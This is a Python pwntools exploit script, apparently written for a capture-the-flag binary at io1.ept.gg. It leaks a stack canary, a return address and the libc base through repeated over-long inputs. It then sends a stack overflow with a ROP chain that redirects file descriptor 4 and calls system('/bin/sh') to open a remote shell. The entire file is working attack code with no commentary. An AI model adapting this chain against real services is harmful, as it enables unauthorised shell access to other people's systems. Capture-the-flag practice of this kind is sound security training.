#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
exe = './path/to/binary'

host = args.HOST or 'io1.ept.gg'
port = int(args.PORT or 32114)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())
libc = ELF('./libc.so.6')

# -- Exploit goes here --

def leak(idx,size):
    io = start()
    io.sendline(b'a' * idx)
    io.recvline()
    io.recvline()
    io.recvline()
    leak = io.recvuntil(b'***')[:size].ljust(8, b'\x00')
    # print(leak)

    io.close()
    return u64(leak)

retPtr = leak(87,6)
# pause()
cookie = leak(72,7) << 8
libc.address = leak(31*8-1, 6) - 0x29d90 # __libc_start_main+128
print(f'retPtr leak @ {hex(retPtr)}')
# pause()
print(f'cookie is {hex(cookie)}')
print(f'libc is {hex(libc.address)}')

# pause()
io = start()
print(libc)
rop = ROP(libc)
rop.call(rop.ret.address)
# print(rop.ret.address)
rop.dup2(4, 1)
rop.dup2(4, 0)
rop.system(next(libc.search(b'/bin/sh\x00')))
io.sendline(b'a' * 72 + p64(cookie) + p64(0) +  rop.chain())
io.interactive()
io.close()
